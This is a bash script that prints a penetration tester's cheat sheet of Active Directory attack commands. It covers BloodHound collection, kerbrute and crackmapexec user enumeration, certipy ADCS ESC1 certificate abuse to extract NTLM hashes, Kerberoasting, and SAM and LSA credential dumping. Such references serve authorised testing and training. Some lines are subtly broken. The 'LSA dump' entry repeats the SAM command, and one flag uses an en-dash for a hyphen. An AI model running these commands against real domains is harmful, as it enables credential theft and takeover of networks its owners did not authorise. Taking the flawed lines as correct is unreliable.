#!/usr/bin/env bash

RED="\033[31m"
GREEN="\033[32m"
BLUE="\033[34m"
YELLOW="\033[33m"
RESET="\033[0m"

## AD Enumeration -----------------------------------

helpBloodHoundPy() {
  printf "${GREEN}[i] Install bloodhound-python\n${RESET}"
  printf "\tpipx install bloodhound\n"

  printf "${GREEN}[i] Run bloodhound-python. You may need other options like listing domain or domain controller\n${RESET}"
  printf "\tbloodhound-python -u user -p passsword -c <collectionMethod>\n"

}

helpUserEnumeration() {
  printf "${GREEN}[i] Uncredentialed Kerberos User Enumeration\n${RESET}"
  printf "\tkerbrute userenum -d domain.local <usernameList.txt>\n"

  printf "${GREEN}[i] Credentialed LDAP user enumeration\n${RESET}"
  printf "\tGetADUsers.py domain.local/user\n"

  printf "${GREEN}[i] Credentialed SMB user enumeration with crackmapexec\n${RESET}"
  printf "\tcrackmapexec smb -u user -p password -d domain.local <computer> --users | tee allUsers.txt\n"
}

helpADCSEnum() {
  printf "${GREEN}[i] Find vulnerable ADCS templates.\n${RESET}"
  printf "\tcertipy find -u user@domain.local -p password -vulnerable\n${RESET}"
}

helpADCSESC1() {
  printf "${GREEN}[i] Request certificate\n${RESET}"
  printf "\tcertipy req -username user@domain.com -password userPassword -ca caName -target caDnsName -template templateName -upn user@domain.com\n"

  printf "${GREEN}[i] Extract ntlm from retrieved certificate.\n${RESET}"
  printf "\tcertipy auth -pfx user.pfx\n"
}

helpKerberoast() {
  printf "${GREEN}[i] Kerberoast using impacket.\n${RESET}"
  printf "\tGetUserSPNs.py –request domain.local/user\n"

  printf "${GREEN}[i] Kerberoast using crackmapexec\n${RESET}"
  printf "\tcrackmapexec ldap <DomainController> -u username -p pass --kerberoasting output.txt\n"
}

helpCredentialDump() {
  printf "${GREEN}[i] SAM dump with crackmapexec. Commonly used optional flags: --local-auth, -d\n${RESET}"
  printf "\tcrackmapexec smb -u user -p password --sam\n"

  printf "${GREEN}[i] LSA dump with crackmapexec\n${RESET}"
  printf "\tcrackmapexec smb -u user -p password --sam\n"
}

helpAll() {
  local script_file="help.sh"
  local function_names=($(awk '/^help[[:alnum:]_]*\(\)/ {print $1}' "$script_file" | sed 's/()//'))

  for func in "${function_names[@]}"; do
    if [[ "$func" != "helpAll" ]]; then
      if declare -F "$func" >/dev/null; then
        echo "${YELLOW} ## $func ##${RESET}"
        $func || echo "Failed to call function: $func"
      else
        echo "Function $func is not defined in the current environment."
      fi
    fi
  done
}
